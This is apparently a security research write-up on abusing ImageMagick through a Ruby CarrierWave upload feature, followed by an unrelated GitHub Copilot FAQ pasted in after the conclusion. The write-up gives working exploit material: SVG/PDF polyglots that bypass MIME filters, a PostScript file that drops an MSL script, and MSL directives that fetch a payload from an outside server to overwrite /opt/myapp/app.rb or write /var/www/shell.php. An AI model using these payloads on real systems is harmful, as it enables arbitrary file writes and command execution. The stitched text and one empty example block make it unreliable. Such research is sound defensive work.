convert-im6.q16: FailedToExecuteCommand `'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4 -dGraphicsAlphaBits=4 '-r72x72'  '-sOutputFile=/tmp/magick-67716IXHzhgRa5Ie%d' '-f/tmp/magick-6771qwKMBsxIbdmC' '-f/tmp/magick-6771jRvPSQyklnZZ'' (1) @ error/pdf.c/InvokePDFDelegate/291.

$ convert ./sample out.png
convert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/560.
[...]
```

That means, filtering the provided files should not only be done by checking the file content of each provided file but also by ensuring their file name's extension matches the one related to the recognized file type.

However, only relying on libraries to infer the file type from the file content and not fixing the *ImageMagick*'s policy is not sufficient as polyglot files could be used to bypass filters.

## Ruby as a case study

*CarrierWave[5](playing-with-imagetragick-like-its-2016#footnote5_b1w15ni "Carrierwave: https://github.com/carrierwaveuploader/carrierwave")*, which is a file upload manager for Ruby applications, can use *ImageMagick* in order to manipulate images when its *MiniMagick* implementation is included:

```

# docsuploader.rb
class DocsUploader < CarrierWave::Uploader::Base
  include CarrierWave::MiniMagick

  def extension_allowlist
    %w[jpg jpeg png webp pdf]
  end

  def content_type_allowlist
    /^(?:image\/|application\/pdf)/
  end

  process convert: 'png'

  def filename
    super.chomp(File.extname(super)) + '.png' if original_filename.present?
  end
end
```

This implementation calls the *convert* command-line tool of *ImageMagick* in order to convert each uploaded file to an image.

In order to filter the allowed file types before they are provided to the *convert* tool, the predicate *content\_type\_allowlist* is used. It internally uses the *MimeMagic* library to infer the file type from the file content.

Several issues could be identified on the declared *DocsUploader* class:

* It is possible to provide a file content that matches a specific file type and in the same time a file extension that matches another one.
* The provided file extension will be forwarded to the *convert* command-line tool.
* *SVG* files are not denied.

This can be verified by creating the following *RSpec[6](playing-with-imagetragick-like-its-2016#footnote6_p7yu9wz "Behaviour Driven Development for Ruby: https://rspec.info/") (Ruby Specification)* file that simulates file uploads:

```

require 'carrierwave/test/matchers'
require './docsuploader'

describe DocsUploader do
  include CarrierWave::Test::Matchers

  let(:user) { double('user') }
  let(:uploader) { DocsUploader.new(user, :docs) }
  let(:path_to_file) { "./test.png" }

  before do
    DocsUploader.enable_processing = true
    File.open(path_to_file) { |f| uploader.store!(f) }
  end

  after do
    DocsUploader.enable_processing = false
    uploader.remove!
  end

  it "has the correct format" do
    expect(uploader).to be_format('png')
  end
end

```

And by creating the file *test.png* which contains an *SVG* file:

```

<?xml version="1.0" standalone="no"?>
<svg height="500" width="500" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<image xlink:href="/does/not/exist" />
</svg>
```

Executing the *RSpec* example confirms *SVG* files are not forbidden even if the provided file extension is *png*:

```

$ rspec tests.rb

[...]
     CarrierWave::ProcessingError:
       translation missing: en.errors.messages.mini_magick_processing_error
[...]
     # MiniMagick::Error:
     #   `convert /tmp/1620672060-227366501931028-0001-5289/test.png -auto-orient /tmp/image_processing20210510-10938-1z02iw6.png` failed with error:
     #   convert-im6.q16: unable to open image `/does/not/exist': No such file or directory @ error/blob.c/OpenBlob/2874.
     #   convert-im6.q16: no decode delegate for this image format `' @ error/constitute.c/ReadImage/560.
     #   convert-im6.q16: non-conforming drawing primitive definition `image' @ error/draw.c/RenderMVGContent/4301.
[...]
Failed examples:
rspec ./tests.rb:21 # DocsUploader has the correct format

```
# Arbitrary file write

## Initial proof of concept

As discussed on the *ImageTragick* website[1](playing-with-imagetragick-like-its-2016#footnote1_4dtn4tx "ImageMagick: https://imagemagick.org/"), if the *MSL (Magick Scripting Language)* coder is enabled, it is possible to obtain an arbitrary file write by using *read* and *write* directives andby using the *GIF* file format:

```

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://my-server.dn/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

If the file already exists, its content will be replaced but the file's permissions will be kept.

However, some conditions are required in order to exploit it:

* The application that will use or execute the overwritten file should accept junk lines as the *GIF* header will also be written.
* The path of the *MSL* file should be known as the *msl* coder can only be forced by adding the  *msl:* prefix to the file path of an existing file.

If the file path is known, the *msl:* coder can be invoked from an *SVG* image file. By default, *ImageMagick* reads each *SVG* file and first converts it to its own file format, which is *MVG (Magick Vector Graphics**).* Moreover, it parses each *xlink:href* xml attribute and converts it to *MVG* *image* directives.

For example, if we provide the following *SVG* file:

```

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg width="720px" height="1080px" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<image xlink:href="msl:/tmp/msl.txt" />
</svg>
```

*ImageMagick* will convert it to the following *MVG* file:

```

Once converted, it will load it and trigger the *MSL* coder which will create the file */var/www/shell.php.*

## Controlled output

Let's say we want to replace a *Ruby* script or a binary file which is stored on the application's folder and is periodically executed. The issue with many *ImageMagick* output formats is the header written at the beginning of the file.

For example, if we provide afile starting with *a GIF* header to *ruby*, it will refuse to interpret the entire file:

```

$ xxd 1.gif
00000000: 4749 4638 3961 0100 0100 8000 00ff ffff  GIF89a..........
00000010: ffff ff21 f904 010a 0001 002c 0000 0000  ...!.......,....
00000020: 0100 0100 0002 024c 0100 3b              .......L..;

$ cat 1.gif sample.rb > test.rb

$ ruby test.rb
test.rb:1: Invalid char `\x01' in expression

```

However, we noticed an interesting file format while reading the *ImageMagick's* documentation[7](playing-with-imagetragick-like-its-2016#footnote7_kiuyj07 "ImageMagick Image Formats: https://imagemagick.org/script/formats.php"):

> **RGB**: **Raw** **red, green, and blue samples.** Use -size and -depth to specify the image width, height, and depth. To specify a single precision floating-point format, use -define quantum:format=floating-point. Set the depth to 32 for single precision floats, 64 for double precision, and 16 for half-precision.

That means, if we can force the output coder to *RGB*, we could make *ImageMagick* write only the *RGB* pixels and thus, only the *RGB* bytes to the output file.

As *ImageMagick* requires a valid image in *read* mode that contains size and pixels information, we decided to use the *BMP* format. In order to generate convenient files, we slightly modified the script *txt2bmp.py* taken from <https://github.com/Hamz-a/txt2bmp>:

* We changed the color pixels order (*BGR* to *RGB*) and the pixels order stored in the matrix.
* We added a parameter for the character used for the *padding* part of the output file, and we removed the padding part added at the beginning of the file content.
* We added the support for binary files.

For example, let's say we want to replace the *Ruby* file */opt/myapp/app.rb*. We first generate our *BMP* image file:

```

$ cat file.rb
Kernel.open("|id>>/tmp/pwned")

$ python3 magick_rgb.py -f file.rb -b image.bmp
Saved as bitmap in: image.bmp

$ xxd image.bmp

00000000: 424d 5a00 0000 0000 0000 3600 0000 2800  BMZ.......6...(.
00000010: 0000 0400 0000 0300 0000 0100 1800 0000  ................
00000020: 0000 2400 0000 c30e 0000 c30e 0000 0000  ..$.............
00000030: 0000 0000 0000 656e 7729 2264 2020 0a20  ......enw)"d  .
00000040: 2020 697c 223e 3e64 6d74 2f70 2f70 7265    i|">>dmt/p/pre
00000050: 4b6c 656e 706f 2e28 6e65                 Klenpo.(ne

```

We then create the following *msl* script that forces the *output* coder to *RGB*:

```

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://my-server.dn/image.bmp" />
<write filename="rgb:/opt/myapp/app.rb" />
</image>
```

Once the *MSL* file is provided to *ImageMagick,* the file is overwritten with a fully controlled content:

```

$ xxd /opt/myapp/app.rb

00000000: 4b65 726e 656c 2e6f 7065 6e28 227c 6964  Kernel.open("|id
00000010: 3e3e 2f74 6d70 2f70 776e 6564 2229 0a20  >>/tmp/pwned").
00000020: 2020 2020
```
## Controlled MSL file path

Upload features implemented on web applications usually store the uploaded files at a location that cannot be predicted. In that case, it is not possible to upload an *MSL* file at a known location.

If the *SVG* file extension is allowed by the targeted application, is provided to *ImageMagick*, and if the filename can be predicted, an *SVG/MSL* polyglot file could be created as described in the InsertScript's blog post[3](playing-with-imagetragick-like-its-2016#footnote3_615iw3i "ImageMagick - Shell injection via PDF password: https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-â¦") and thus, controlling the file path is not needed.

However, let consider we are targeting the *Ruby* code just described before where the *SVG* extension is forbidden. If the *PDF* coder is allowed on the policy and if the *pdf* extension can be provided to *ImageMagick*, writing at a known location may be allowed by using a *PostScript* file.

### PDF coder and Ghostscript

*ImageMagick* relies on *Ghostscript* in order to manipulate *PDF* and *PostScript* files. Indeed, when the *PDF* coder is selected, the file is forwarded to *Ghostscript*:

```

//coders/pdf.c
//[...]
static Image *ReadPDFImage(const ImageInfo *image_info,ExceptionInfo *exception)
{
//[...]
  /*
    Render Postscript with the Ghostscript delegate.
  */
  if (image_info->monochrome != MagickFalse)
    delegate_info=GetDelegateInfo("ps:mono",(char *) NULL,exception);
//[...]
  (void) FormatLocaleString(command,MagickPathExtent,
    GetDelegateCommands(delegate_info),
    read_info->antialias != MagickFalse ? 4 : 1,
    read_info->antialias != MagickFalse ? 4 : 1,density,options,filename,
    postscript_filename,input_filename);
//[...]
  status=InvokeGhostscriptDelegate(read_info->verbose,command,message,
    exception);
//[...]
```

The *ps* delegate declared in *delegates.xml* calls the *gs* command-line utility. When the *gs* command-line is invoked, *Ghostscript* tries to infer the file type from the file content. The parser is quite permissive, it accepts a *PostScript* header that starts with a white-space character:

```

$ cat file.pdf
 %!
(I'm a PS file!\n) print
quit

$ convert -verbose test.pdf out.png
'gs' -sstdout=%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 '-sDEVICE=pngalpha' -dTextAlphaBits=4 -dGraphicsAlphaBits=4 '-r72x72'  '-sOutputFile=/tmp/magick-S9eUIBLTg3xGO-uIv6CVbHWTG_v3aNmb%d' '-f/tmp/magick-GgoTggFwtv2GfNfVxqOdCgLk1spYoHE8' '-f/tmp/magick-Zf--hxaZ-fx7xwGpaCCp1HNbIZj8OTR7'

I'm a PS file!
convert-im6.q16: no images defined `out.png' @ error/convert.c/ConvertImageCommand/3229.
```

Asthe *gs* command-line is invoked in *safe* mode (which is enabled by default since the *Ghostscript* version 9.50), only the files stored on the */tmp* folder can be manipulated using *PostScript* files.

This allows us to create an *MSL* file at a known location*:*

```

 %!
/outf (/tmp/msl.txt) (w) file def
outf (<?xml version="1.0" encoding="UTF-8"?><image><read filename='http://my-server.dn/image.bmp'/><write filename='rgb:/opt/myapp/app.rb' /></image>) writestring
outf closefile
showpage
quit
```
### Mime parsers

In order to provide it to *ImageMagick* and *Ghostscript* through the *Carrierwave* uploader, we need to make sure the file is recognized and allowed by the web application.

Some parsers are quite permissive as they recognize *PDF* files even if the expected magic bytes are not located at the beginning of the file:

```

#testmime.rb

require "mimemagic"
require "marcel"

file_path = ARGV[0]

print "[MimeMagic]  content-type: #{MimeMagic.by_magic(File.open(file_path))}\n"
print "[Marcel]     content-type: #{Marcel::MimeType.for Pathname.new(file_path)}\n"

```
```

$ cat sample.bin
 %!
(I'm a PS file!\n) print
quit
%PDF-1.3

$ ruby testmime.rb sample.bin
[MimeMagic]  content-type: application/pdf
[Marcel]     content-type: application/pdf
```

In that case, if the content-type *application/pdf* is allowed on the *Carrierwave* uploader, polyglot files can be created in order to bypass such filters.

For example, let's say *SVG* files are now forbiddenon the *Carrierwave* uploader:

```

# docsuploader.rb
class DocsUploader < CarrierWave::Uploader::Base
#[...]
  def content_type_allowlist
    /^(?:image\/(?:jpeg|png|wepb))|application\/pdf)$/
  end
#[...]
end
```

If we now provide an *SVG* file, it will be rejected (the same *RSpec* file as described before is used here):

```

$ rspec tests.rb
[...]
     CarrierWave::IntegrityError:
       You are not allowed to upload  image/svg+xml files
[...]
```

However, creating a simple *PDF/SVG* polyglot file still allows us to provide an *SVG* file to *ImageMagick*:

```

$ cat test.png
<SVG height="1" width="1"><!--
%PDF-1.3
-->
<image xlink:href="/does/not/exist" />
</SVG>

$ rspec tests.rb
[...]
     # --- Caused by: ---
     # MiniMagick::Error:
     #   `convert /tmp/1620740403-993415681373467-0001-8388/test.png -auto-orient /tmp/image_processing20210511-4893-1ig0bbw.png` failed with error:
     #   convert-im6.q16: unable to open image `/does/not/exist': No such file or directory @ error/blob.c/OpenBlob/2874.

     #   convert-im6.q16: non-conforming drawing primitive definition `image' @ error/draw.c/RenderMVGContent/4301.
[...]
```
## Putting things together

Finally, it is possible to obtain an arbitrary file write on the *Ruby* application by combining all the files formats we mentioned before:

* *image.bmp* available on a controlled server:

```

$ cat file.rb
Kernel.open("|id>>/tmp/pwned")

$ python3 magick_rgb.py -f file.rb -b image.bmp
Saved as bitmap in: image.bmp

$ xxd image.bmp

00000000: 424d 5a00 0000 0000 0000 3600 0000 2800  BMZ.......6...(.
00000010: 0000 0400 0000 0300 0000 0100 1800 0000  ................
00000020: 0000 2400 0000 c30e 0000 c30e 0000 0000  ..$.............
00000030: 0000 0000 0000 656e 7729 2264 2020 0a20  ......enw)"d  .
00000040: 2020 697c 223e 3e64 6d74 2f70 2f70 7265    i|">>dmt/p/pre
00000050: 4b6c 656e 706f 2e28 6e65                 Klenpo.(ne

$ python3 -m http.server 8080
```

* *write\_msl.pdf*: a simple *PostScript/PDF* file:

```

 %!
/outf (/tmp/msl.txt) (w) file def
outf (<?xml version="1.0" encoding="UTF-8"?><image><read filename='http://127.0.0.1:8080/image.bmp'/><write filename='rgb:/opt/myapp/app.rb' /></image>) writestring
outf closefile
showpage
quit
%PDF-1.3

```

* *trigger\_msl**.png*: a simple *SVG/PDF* file:

```

<SVG height="1" width="1"><!--
%PDF-1.3
-->
<image xlink:href="msl:/tmp/msl.txt" />
</SVG>

```

Simulating the two consecutive file uploads will trigger the arbitrary file write:

```

require 'carrierwave/test/matchers'
require './docsuploader'

describe DocsUploader do
  include CarrierWave::Test::Matchers

  let(:model) { double('sample') }
  let(:uploader) { DocsUploader.new(model, :docs) }

  let(:file_paths) {[
    "write_msl.pdf", # simple PS/PDF
    "trigger_msl.png" # simple SVG/PDF polyglot
  ]}

  before do
    DocsUploader.enable_processing = true
    file_paths.map { |p| File.open(p) }
      .each { |f| uploader.store!(f) }
  end

  after do
    DocsUploader.enable_processing = false
    uploader.remove!
  end

  it "has the correct format" do
    expect(uploader).to be_format('png')
  end
end

```
```

$ ls -lah /tmp/msl.txt
ls: cannot access '/tmp/msl.txt': No such file or directory

$ cat /opt/myapp/app.rb
print "Overwrite it!"

$ rspec tests.rb
[...]
    # ------------------
     # --- Caused by: ---
     # MiniMagick::Error:
     #   `convert /tmp/1620743636-912225227625237-0002-4573/trigger_msl.png -auto-orient /tmp/image_processing20210511-5503-10oyif3.png` failed with error:
     #   /var/lib/gems/2.5.0/gems/mini_magick-4.11.0/lib/mini_magick/shell.rb:17:in `run'
[...]

$ cat /tmp/msl.txt
<?xml version="1.0" encoding="UTF-8"?><image><read filename='http://127.0.0.1:8080/image.bmp'/><write filename='rgb:/opt/myapp/app.rb' /></image>

$ cat /opt/myapp/app.rb
Kernel.open("|id>>/tmp/pwned")

```

Finally, the fileÂ */opt/myapp/app.rb* has been replaced by our controlled content. If the file was periodically executed, we would have been able to execute arbitrary commands on the underlying system.

# Conclusion

In conclusion, we obtained an arbitrary file write from an upload feature that seemed safe at first glance. These different exploitation methods allow to highlight that the configuration of some tools needs a particular attention if they are used in production.

In order to prevent this kind of vulnerabilities, one should take care of:

* Content type filters. When processing files it is important to keep in mind that it is possible to bypass filters with some tricks or polyglot files.
* Dependencies that are shipped with operating systems. Packaged versions are not always up to date and these packages are not always safe to use with their default settings.
* File converters. They should be sandboxed in order to reduce the risk of newer vulnerabilities.

However, it shows an interesting way of reading files using the *grey* coder that we were not aware of.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
